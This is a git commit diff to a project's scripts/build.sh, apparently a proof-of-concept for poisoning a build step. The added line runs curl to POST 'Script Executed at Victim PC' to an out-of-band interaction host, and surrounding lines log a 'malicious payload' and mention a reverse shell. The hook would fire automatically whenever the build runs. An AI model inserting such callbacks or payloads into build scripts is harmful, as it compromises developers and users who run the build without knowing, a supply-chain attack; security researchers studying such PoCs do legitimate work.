96de3cf5e867142aa7d3bed6beee25196b7e44c4
predator97x <134788536+predator97x@users.noreply.github.com>
2025-04-11 13:57:59 +0530

    Update build.sh

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 set -e
 echo "[*] Executing malicious payload..." >> ~/malicious_payload.log
+curl -X POST 'http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun/log' -d 'Script Executed at Victim PC'
 
 # Example destructive (or high impact) payload -- for PoC purposes, we use a benign command
 # For a reverse shell (do not enable in production without authorization):
